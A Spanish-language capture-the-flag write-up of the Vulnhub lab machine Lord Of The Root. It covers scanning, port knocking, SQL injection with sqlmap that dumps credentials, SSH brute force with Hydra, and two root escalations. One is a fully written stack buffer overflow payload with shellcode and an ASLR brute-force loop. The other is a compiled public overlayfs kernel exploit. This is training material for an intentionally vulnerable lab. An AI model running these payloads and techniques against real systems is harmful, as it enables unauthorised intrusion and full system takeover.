---
title: Lord Of The Root 1.0.1 Writeup - Vulnhub
date: 2025-02-09
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, Lord Of The Root 1.0.1, OSCP Prep, Buffer Overflow, Port Knocking, SQLinjection]
image:
  path: /assets/img/commons/vulnhub/LordOfTheRoot1/portada.png
---

Anterior [**OSCP Lab 1**](https://lvs3c.github.io/posts/OSCP-Tr0ll1/)

¡Saludos!

`OSCP Lab 2`

En este writeup, realizaremos la máquina [**Lord Of The Root 1.0.1**](https://www.vulnhub.com/entry/lord-of-the-root-101,129/). Se trata de una máquina **Linux** en la cual veremos: 
- **Enumeración de servicios** con nmap.
- **Port Knocking** para abrir puerto oculto.
- **Desencriptar cadena base64** para obtener una dirección de la url.
- **SQLinjection** para obtener datos de la base mediante panel de login.
- **Hydra** para fuerza bruta sobre ssh, validando datos obtenidos.
- Y por último, elevamos nuestro privilegio de dos maneras, para convertirnos en root y obtener la flag del CTF.
  - Primera: Explotando un **Buffer Overflow**.
  - Segunda: Explotando la vulnerabilidad **overlayfs**.

Let's jump in!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.14     00:0c:29:e3:3b:88       VMware, Inc.
10.11.12.200    00:50:56:e3:1f:27       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.398 seconds (106.76 hosts/sec). 3 responded

```

```bash
❯ ping -c 1 10.11.12.14
PING 10.11.12.14 (10.11.12.14) 56(84) bytes of data.
^C
--- 10.11.12.14 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

La máquina no responde `ping`, esto puede deberse a reglas de firewall.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- -sCV 10.11.12.14 -n -Pn -oG nmap_scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 23:13 -03
Nmap scan report for 10.11.12.14
Host is up (0.00024s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
MAC Address: 00:0C:29:E3:3B:88 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.78 seconds
```

Sólo nos trae el puerto 22 (SSH), dicha versión está bajo varias vulnerabilidades, pero vamos a probar conectarnos por SFTP que corre por el puerto 22 para validar si existe alguna información.

```bash
❯ sftp 10.11.12.14
The authenticity of host '10.11.12.14 (10.11.12.14)' can't be established.
ED25519 key fingerprint is SHA256:Rz24fg01xp2jMdwk9c44ijnZAz1uaUlvRXX7QU+ERtI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.12.14' (ED25519) to the list of known hosts.
ls

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
lvs3c@10.11.12.14's password:
```

Dicho mensaje, hace referencia a que debemos usar la ténica `knock` de puertos para poder habilitar un puerto oculto.

El texto del mensaje `Easy as 1,2,3` nos revela los puertos que devolemos "golpear". Usamos `knock` y luego volvemos a correr nmap.

```bash
❯ ./knock 10.11.12.14 1 2 3
```

También podemos hacer port knocking con namp.

```bash
❯ nmap -r -p1,2,3 10.11.12.14 -Pn --max-retries 0 --max-parallelism 1
```

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.14 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 23:23 -03
Nmap scan report for 10.11.12.14
Host is up (0.00039s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 00:0C:29:E3:3B:88 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
```

Ahora tenemos el puerto 1337.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p22,1337 -sCV 10.11.12.14 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 23:31 -03
Nmap scan report for 10.11.12.14
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:E3:3B:88 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 6.6.1p1`.
- Puerto `1337` servidor `Apache httpd 2.4.7`.

### HTTP - 1337

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.14:1337/
http://10.11.12.14:1337/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.11.12.14]
```

![web](/assets/img/commons/vulnhub/LordOfTheRoot1/web.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p1337 --script http-enum 10.11.12.14 -oN nmap_webscan
```

No nos trae resultados, probamos `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.14:1337/ -e -x php,txt,zip,bak,bkp,html,htm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.14:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,htm,php,txt,zip,bak,bkp
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.14:1337/.php                 (Status: 403) [Size: 284]
http://10.11.12.14:1337/images               (Status: 301) [Size: 317] [--> http://10.11.12.14:1337/images/]
http://10.11.12.14:1337/.html                (Status: 403) [Size: 285]
http://10.11.12.14:1337/.htm                 (Status: 403) [Size: 284]
http://10.11.12.14:1337/index.html           (Status: 200) [Size: 64]
http://10.11.12.14:1337/404.html             (Status: 200) [Size: 116]
http://10.11.12.14:1337/.php                 (Status: 403) [Size: 284]
http://10.11.12.14:1337/.html                (Status: 403) [Size: 285]
http://10.11.12.14:1337/.htm                 (Status: 403) [Size: 284]
http://10.11.12.14:1337/server-status        (Status: 403) [Size: 293]
Progress: 1764480 / 1764488 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos el archivo `404.html`, analizamos el código de la web y encontramos una cadena en `base64`{: .filepath}.

![404](/assets/img/commons/vulnhub/LordOfTheRoot1/404.png){: .center-image }

Procedemos a desencriptar dicha cadena.

```bash
❯ echo THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d; echo
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

❯ echo Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d; echo
/978345210/index.php
```

La cadena revela otra cadena en base64, la cual desencriptada resulta en un nuevo directorio.

![sqli](/assets/img/commons/vulnhub/LordOfTheRoot1/sqli.png){: .center-image }

Tenemos un panel de login, vamos a capturar la solicitud con `Burp Suite` y analizarla con `sqlmap` en buscar de una **sqlinjection**.

![request](/assets/img/commons/vulnhub/LordOfTheRoot1/request.png){: .center-image }


## Explotación

---

Vamos a utilizar `sqlmap` para obtener datos de la base.

```bash
❯ sqlmap -r login.req --dbs
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

❯ sqlmap -o -r login.req -D Webapp --tables
Database: Webapp
[1 table]
+-------+
| Users |
+-------+

❯ sqlmap -o -r login.req -D Webapp -T Users --columns

Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

❯ sqlmap -o -r login.req -D Webapp -T Users --dump

Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Ya tenemos la lista de usuarios y claves, ahora probamos `hydra` para validar qué usuario puede ingresar al sistema por `SSH`{: .filepath}.

```bash
❯ hydra -L user -P pass 10.11.12.14 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 15:29:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.11.12.14:22/
[22][ssh] host: 10.11.12.14   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 15:30:08
```

*Validamos el acceso por SSH, nos conectamos.*

```bash
❯ ssh smeagol@10.11.12.14

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
smeagol@10.11.12.14's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________
                            |    |   \_____  \__    ___/\______   \
                            |    |    /   |   \|    |    |       _/
                            |    |___/    |    \    |    |    |   \
                            |_______ \_______  /____|    |____|_  /
                                    \/       \/                 \/
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ |
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ |
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ |
       \/       \/          \/            \/     \/       \/                  \/     \/      \/
Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
smeagol@LordOfTheRoot:~$
```

## Escalación de privilegios

---

> Podemos escalar privilegios de varias formas, vamos a ver **dos** maneras distintas.
{: .prompt-tip }

Listamos los binarios `SUID` del sistema, de acá podemos tener las `dos`{: .filepath} primeras formas.

```bash
smeagol@LordOfTheRoot:~$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/ping6
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/X
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/sbin/uuidd
/usr/sbin/pppd
```

### Primera

- Buffer Overflow

Dentro de la carpeta `/SECRET/door1|2|3` se encuentra el archivo file, validamos los archivos y son binarios.

```bash
smeagol@LordOfTheRoot:/SECRET/door3$ file file
file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped
```

```bash
smeagol@LordOfTheRoot:/SECRET/door1$ ./file
Syntax: ./file <input string>
smeagol@LordOfTheRoot:/SECRET/door1$ ./file A
smeagol@LordOfTheRoot:/SECRET/door1$
```

Nos pide ingresar una cadena, probamos ingresar `300 A` usando python para ver si se rompe el programa.

En los directorios `/SECRET/door1` y `/SECRET/door3` el archivo `file` no son vulnerables a buffer overflow.

```bash
smeagol@LordOfTheRoot:/SECRET/door1$ ./file $(python -c 'print "A" * 300')

smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A" * 300')
Segmentation fault (core dumped)

smeagol@LordOfTheRoot:/SECRET/door3$ ./file $(python -c 'print "A" * 300')
```

El archivo `file` dentro `/SECRET/door2/`{: .filepath} es vulnerable.

`Pasos del buffer overflow:`{: .filepath}

1. Validar [**ASLR**](https://lovtechnology.com/que-es-aslr-address-space-layout-randomization-como-funciona-y-para-que-sirve/).
2. Crear una cadena de caracteres con `msf-pattern_create` para obtener el valor de `EIP`.
3. Utilizar  `msf-pattern_offset` para calcular la longitud del patrón de caracteres.
4. Encontrar el `jmp ESP`, para poner nuestro script en la pila de ejecución, siempre y cuando `ASLR` esté desactivado.
5. Usamos un `shellcode` para ejecutar una **/bin/sh**, anteponiendo `NOPS` para darle tiempo al cpu.

#### Comenzamos:

Comprobamos que la máquina víctima tiene instalado `gdb` para depurar el programa.

```bash
smeagol@LordOfTheRoot:/SECRET/door2$ which gdb
/usr/bin/gdb
```

1 - Validamos si el Sistema Operativo tiene activado <kbd>ASLR</kbd> de la siguiente manera.

```bash
smeagol@LordOfTheRoot:/SECRET/door2$ cat /proc/sys/kernel/randomize_va_space
2
```

Lo tiene activado `(2)`{: .filepath} y al no ser usuario con privilegios no podemos alterar dicho parámetro, con lo cual vamos a estar frente a aleatorización de direcciones. Para poder saltar esto, vamos a tener que correr un bucle hasta que demos con una dirección de memoria correcta y pueda ejecutar nuestro payload.

2 - Creamos una cadena de 300 caracteres con <kbd>msf-pattern-create</kbd> y abrimos el programa *file* con **gdb**.

Obtenemos el valor de `EIP`.

```bash
❯ msf-pattern_create -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

```bash
smeagol@LordOfTheRoot:/SECRET/door2$ gdb -q file
Reading symbols from file...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /SECRET/door2/file Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x41376641 in ?? ()
(gdb)
```

3 - Ya tenemos el valor de *EIP*, usamos <kbd>msf-pattern-offset</kbd> para averiguar la cantidad de caracteres que debemos usar antes que se rompa el programa, pasando en el parámetro `q` el valor de EIP y `-l` la longitud que en este caso son 300 caracteres.

```bash
❯ msf-pattern_offset -q 41376641 -l 300
[*] Exact match at offset 171
```

En este punto, vamos a crear una cadena de 171 "A" y le sumamos 4 "B" para validar si las mismas "B" apuntan al registro EIP. 

La letra "B" en hexa es 42.

```bash
smeagol@LordOfTheRoot:/SECRET/door2$ gdb -q file
Reading symbols from file...(no debugging symbols found)...done.
(gdb) r $(python2 -c 'print "A" * 171 + "B" * 4')
Starting program: /SECRET/door2/file $(python2 -c 'print "A" * 171 + "B" * 4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

Efectivamente, las 4 “B” están en el registro EIP.

4 - En este caso no vamos a poder encontrar el `jmp ESP`, debido a que `ASLR` está activado. Usaremos el valor del registro `ESP`, procedemos a buscarlo añadiendo `NOPS` al final de la cadena.

Para agregar los `NOPS` a la cadena, lo hacemos con: **"\x90"**.

Para filtrar por el registro `ESP` hacemos: *x/s $esp*.

```bash
(gdb) r $(python2 -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
`/SECRET/door2/file' has changed; re-reading symbols.
(no debugging symbols found)
Starting program: /SECRET/door2/file $(python2 -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xbfe19340:     '\220' <repeats 200 times>...
(gdb)
```

Tenemos el valor de `ESP` ---> **0xbfe19340**.

La dirección del ESP la debemos representar en little endian, con lo cual debemos escribirla al revés.

5 - Utilizamos el siguiente [`shellcode`](https://www.exploit-db.com/exploits/37495).

Payload Final:

```bash
`for i in {1..10000}; do (./file $(python2 -c 'print "A" * 171 + "\x40\x93\xe1\xbf" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done`
```

Resultado:

```bash
smeagol@LordOfTheRoot:/SECRET/door1$ for i in {1..10000}; do (./file $(python2 -c 'print "A" * 171 + "\x40\x93\xe1\xbf" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# cd /root
# ls
Flag.txt  buf  buf.c  other  other.c  switcher.py
# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
#
```

### Segunda
 
- Exploit overlayfs: El sistema es un Ubuntu viejo, si buscamos en searchsploit encontramos muchos fallos, pero nos quedamos con los siguientes.

```bash
❯ searchsploit Ubuntu 14
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                         | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                    | linux/local/37293.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                         | linux/local/39166.c
```

Vamos a usar el script en c, `39166.c`, lo descargamos en la máquina víctima, lo compilamos y ejecutamos, somos root.

```bash
smeagol@LordOfTheRoot:/tmp$ gcc 39166.c -o privesc
smeagol@LordOfTheRoot:/tmp$ ./privesc
root@LordOfTheRoot:/tmp# id
uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
root@LordOfTheRoot:/tmp# cd /root
root@LordOfTheRoot:/root# ls
Flag.txt  buf  buf.c  other  other.c  switcher.py
root@LordOfTheRoot:/root# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```


Hope it helps!